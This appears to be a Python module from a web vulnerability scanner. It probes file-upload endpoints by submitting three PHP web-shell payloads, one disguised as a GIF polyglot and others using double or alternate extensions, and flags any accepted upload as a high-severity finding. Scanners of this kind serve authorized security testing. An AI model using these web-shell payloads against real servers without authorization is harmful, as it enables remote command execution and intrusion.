"""File upload bypass scanner (basic)."""
from core.http import post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    # try uploading a polyglot / double extension
    payloads = [
        ("shell.php", "GIF89a;<?php system($_GET['c']); ?>", "image/gif"),
        ("shell.php.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"),
        ("shell.phtml", "<?php system($_GET['c']); ?>", "text/plain"),
    ]
    for fname, content, ctype in payloads:
        try:
            files = {"file": (fname, content, ctype)}
            r = post(url, files=files)
        except Exception:
            continue
        if r.status == 0:
            continue
        text = (r.text or "").lower()
        if r.status in (200, 201) and ("success" in text or "uploaded" in text or fname in text):
            findings.append(Finding(
                id=f"upload-{fname}-{hash(url) & 0xffff:x}",
                target=parsed.netloc,
                type="File Upload Bypass (potential)",
                severity="high",
                url=url,
                parameter="file",
                payload=fname,
                evidence=f"Upload accepted (status {r.status})",
                response_snippet=r.snippet(200),
                confidence=0.4,
            ))
    log_event(parsed.netloc, "upload_scan", {"url": url, "findings": len(findings)})
    return findings
